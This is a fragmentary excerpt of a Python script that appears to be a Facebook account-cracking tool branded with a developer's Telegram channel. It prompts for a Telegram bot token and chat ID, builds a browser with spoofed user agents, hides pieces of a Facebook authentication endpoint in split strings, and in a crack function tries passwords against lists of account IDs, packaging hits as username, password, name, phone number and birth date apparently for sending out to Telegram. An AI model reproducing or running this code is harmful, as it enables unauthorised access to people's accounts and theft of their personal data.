...
token1 = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
print('\n')
ID1 = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
tlg1 = '\n𝚆𝙴𝙻𝙲𝙾𝙼𝙴 -نورت الاداه المطور عباده\n🇬🇧━━━━━━━━❖━━━━━━━━━🇬🇧\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة المدفوعه\n    قناة المطور  https://t.me/V33tt\n   تـنسى ان تـرسل صـور الـصيد -  @akbod\n\n🇬🇧━━━━━━━━❖━━━━━━━━━🇬🇧 '
...
try:
	import mechanize
	abod_folder = mechanize.Browser()
	abod_folder.set_handle_robots(False)
	abod_folder.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
except:
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')
		...
		abod_folder.addheaders = [('User-Agent', us)]
		li = "b-ap"
		lo = "od/auth.l"
		op="3f555f98"
		op2 = "d7aa0c"
		...
		if 'access_token' in po:
			...
			linex()
			print(f"{a40}✦"*60)
			abod(f'{a1}[{a3}√{a1}] {a5}𝗱𝗼𝗻𝗲 𝗻𝗼𝘄 𝗿𝗲𝘀𝘁 𝘁𝗵𝗲 𝘁𝗼𝗼𝗹 ✦')
			linex()
...
def MLF():
	...
	from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["isometric1", "isometric2"])).renderText("abod"))
	logo =                                          """   
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄abod᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄abod᭄
                           \x1b[1;92m╔═════════════════════════════╗
                           \x1b[1;92m║➣TOOL NAME : [MAKE FILE]║
                           \x1b[1;92m║➣CHANNEL   : [V33tt]    ║
                           \x1b[1;92m║➣TELEGRAM  : [akbod]       ║
                          \x1b[1;92m ║➣DEVELOPER : [abod] ║
                           \x1b[1;92m║➣Group     : [v33tt]         ║
                           \x1b[1;92m║➣HOBBY     : [britaniun 🇬🇧]       ║
                           \x1b[1;92m╚═════════════════════════════╝
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄abod᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄abod᭄
"""
...
╚═══════════════════╝      """)
	...
	if xo in ['2']:
		...
		os.system('rm -rf .token.txt')
		linex()
		abod(f"{a1}[{a3}√{a1}] {a5}𝗰𝗼𝗼𝗸𝗶𝗲𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 • ")
		exit()
	if xo in ['3']:
		...
		linex()
		abod(f'{a1}[{a3}×{a1}] {a5}𝘄𝗿𝗼𝗻𝗴 𝗰𝗵𝗼𝗶𝗰𝗲  •')
		time.sleep(1)
		MLF()
siid=[]
sep=[]
...
class file_create_menu():
	...
	def file_unlimmited(self):
		os.system('clear')
		from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["slant"])).renderText("abod"))
		print("•" *60)
		limit = int("1")
		try:
			print(f"{a36}𝗲𝗻𝘁𝗲𝗿{a18} 𝘁𝗵𝗲{a4}  𝗳𝗶𝗹𝗲 {a3}𝗻𝗮𝗺𝗲 {a5}  𝘄𝗶𝘁𝗵 {a30}({a40}.txt{a30})       \n{a4}𝗳𝗼𝗿{a5} 𝗲𝘅𝗮𝗺𝗽𝗹𝗲 {a30}({a1}abod.txt{a30})")
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')
			...
			print('♕abod♕'.format(len(open(lok,'r').read().splitlines())))
...
#    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), 1, **('max_time',))
#except:
#    pass
#    os.system('pip install mechanize')
...
def main_menu():
    ...
    print('')
    print(f'{B}[{M} 2 {B}] {F}– {H}Check - تشغيل الاداة')
    print('')
    print('')
...
def SD_abod():
    ...
    print(('\033[92m—'*25)+'\n• DeCoDe By @akbod•\n'+('—'*25))
    print(f'{H}▰{X}▱' * 20)
    print(f'\n    {X}DEVLOPER :{F} 『abod』⇣🇬🇧 |5.1M\n    {B}CHANEL TELEGRAM :{M} @V33tt\n    {U}USER TELEGRAM : {H}@akbod\n    NEW UPDATE')
    print(f'{Z}▰{B}▱' * 20)
...
#def dup():
#    print(f'{dot}Example   {RED}:{H} /sdcard/YASIR.txt')
#    print(led)
#    Error = input(f'{wt}{N}File Name {RED}:{H} ')
#    print(led)
#    print(f'{dot}Example   {RED}:{H} /sdcard/YASIR.txt')
#    print(led)
...
#    print(led)
#    print(f'{dot}Removing Successful{RED}:{H} ' + Error)
#    print(led)
#    print(f'{dot}File Total Ids {RED}:{H} ' + str(len(open(Error1).read().splitlines())))
#    print(led)
#    print(f'{dot}New File Save As {H} ' + Error1)
#    print(led)
...
def crack(idf,pwv):
	...
	fff = '%'
	print(f'\r%s{bi}[『abod] %s # %s # OK: %s #  CP: %s #  %s%s%s' %(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ')
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun += f'DECODED BY @akbod\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 YASIR GOD☑️\n⋘─────━𓆩abod𓆪‏━─────⋙\n👑 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n👑 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n\n👑 - Nama Akun: {nama}\n\n👑 - Nomor Aktif : {nomer}\n\n👑 - Tahun Akun : {tahun}\n\n👑 - Tanggal Lahir : {ttl}\n\n⋘─────━𓆩abod 𓆪‏━─────⋙\n⊊𝗕𝗬⊋ ➩ @akbod / @V33tt\n'
